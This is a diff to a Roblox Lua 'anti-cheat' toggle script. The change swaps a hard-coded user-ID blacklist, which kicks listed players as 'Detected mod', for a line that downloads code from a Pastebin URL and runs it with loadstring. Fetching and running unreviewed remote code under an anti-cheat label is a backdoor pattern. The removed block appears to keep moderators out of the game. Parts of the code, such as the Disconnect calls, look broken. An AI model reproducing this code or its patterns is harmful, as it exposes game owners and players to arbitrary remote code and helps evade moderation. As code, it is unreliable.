@@ -53,21 +53,15 @@ MobileToggleButton.TextSize = 18
 MobileToggleButton.Font = Enum.Font.SourceSans
 
 local isAntiCheatActive = false
-local blacklistedUserIds = {
-    163721789, 15427717, 201454243, 822999, 63794379, 17260230, 28357488,
-    93101606, 8195210, 89473551, 16917269, 85989579, 1553950697, 476537893,
-    155627580, 31163456, 7200829, 25717070, 201454243, 15427717, 63794379,
-    16138978, 60660789, 17260230, 16138978, 1161411094, 9125623, 11319153,
-    34758833, 194109750, 35616559, 1257271138, 28885841, 23558830, 25717070
-}
+local antiCheatScript
 
-local function isUserBlacklisted(userId)
-    for _, id in ipairs(blacklistedUserIds) do
-        if id == userId then
-            return true
-        end
+local function loadAntiCheatScript()
+    if antiCheatScript then
+        pcall(function()
+            antiCheatScript:Disconnect()
+        end)
     end
-    return false
+    antiCheatScript = loadstring(game:GetService("HttpService"):GetAsync("https://pastebin.com/raw/QVXGpvNU"))()
 end
 
 local function toggleAntiCheat()
@@ -76,23 +70,15 @@ local function toggleAntiCheat()
     StatusLabel.BackgroundColor3 = isAntiCheatActive and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
     ToggleButton.Text = isAntiCheatActive and "Disable" or "Enable"
     ToggleButton.BackgroundColor3 = isAntiCheatActive and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
+    MobileToggleButton.Text = MainFrame.Visible and "Close Menu" or "Open Menu"
 
     if isAntiCheatActive then
-        game.Players.PlayerAdded:Connect(function(player)
-            if isUserBlacklisted(player.UserId) then
-                player:Kick("Detected mod")
-            end
-        end)
-        for _, player in ipairs(game.Players:GetPlayers()) do
-            if isUserBlacklisted(player.UserId) then
-                player:Kick("Detected mod")
-            end
-        end
+        loadAntiCheatScript()
     else
-        for _, connection in ipairs(game:GetConnections()) do
-            if connection.Connected then
-                connection:Disconnect()
-            end
+        if antiCheatScript then
+            pcall(function()
+                antiCheatScript:Disconnect()
+            end)
         end
     end
 end
